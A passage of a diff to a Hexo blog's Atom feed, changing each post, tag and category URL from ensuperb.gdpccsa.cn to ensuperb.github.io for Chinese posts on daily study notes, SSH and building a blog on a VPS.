-      <category term="手记" scheme="https://ensuperb.gdpccsa.cn/tags/%E6%89%8B%E8%AE%B0/"/>
+      <category term="手记" scheme="https://ensuperb.github.io/tags/%E6%89%8B%E8%AE%B0/"/>
     
   </entry>
   
   <entry>
     <title>2019-日常学习手记</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/2019-07-daliylearning/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/2019-07-daliylearning/</id>
+    <link href="https://ensuperb.github.io/posts/2019-07-daliylearning/"/>
+    <id>https://ensuperb.github.io/posts/2019-07-daliylearning/</id>
     <published>2019-07-30T06:00:00.000Z</published>
     <updated>2020-10-17T05:04:47.069Z</updated>
     
@@ -379,17 +403,17 @@
     </summary>
     
     
-      <category term="汇总" scheme="https://ensuperb.gdpccsa.cn/categories/%E6%B1%87%E6%80%BB/"/>
+      <category term="汇总" scheme="https://ensuperb.github.io/categories/%E6%B1%87%E6%80%BB/"/>
     
     
-      <category term="手记" scheme="https://ensuperb.gdpccsa.cn/tags/%E6%89%8B%E8%AE%B0/"/>
+      <category term="手记" scheme="https://ensuperb.github.io/tags/%E6%89%8B%E8%AE%B0/"/>
     
   </entry>
   
   <entry>
     <title>关于SSH的新理解</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/new-understand-about-SSH/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/new-understand-about-SSH/</id>
+    <link href="https://ensuperb.github.io/posts/new-understand-about-SSH/"/>
+    <id>https://ensuperb.github.io/posts/new-understand-about-SSH/</id>
     <published>2019-07-29T01:31:01.000Z</published>
     <updated>2020-06-19T03:50:12.927Z</updated>
     
@@ -406,14 +430,14 @@
     
     
     
-      <category term="杂谈" scheme="https://ensuperb.gdpccsa.cn/tags/%E6%9D%82%E8%B0%88/"/>
+      <category term="杂谈" scheme="https://ensuperb.github.io/tags/%E6%9D%82%E8%B0%88/"/>
     
   </entry>
   
   <entry>
     <title>利用Hexo与VPS搭建服务器的一些心得</title>
-    <link href="https://ensuperb.gdpccsa.cn/posts/lettalkaboutbuildinghexowithVPS/"/>
-    <id>https://ensuperb.gdpccsa.cn/posts/lettalkaboutbuildinghexowithVPS/</id>
+    <link href="https://ensuperb.github.io/posts/lettalkaboutbuildinghexowithVPS/"/>
+    <id>https://ensuperb.github.io/posts/lettalkaboutbuildinghexowithVPS/</id>
     <published>2019-06-08T02:40:47.000Z</published>
     <updated>2020-07-11T13:31:27.028Z</updated>
     
@@ -431,7 +455,7 @@
     
     
     
-      <category term="手记" scheme="https://ensuperb.gdpccsa.cn/tags/%E6%89%8B%E8%AE%B0/"/>
+      <category term="手记" scheme="https://ensuperb.github.io/tags/%E6%89%8B%E8%AE%B0/"/>
     
   </entry>
   
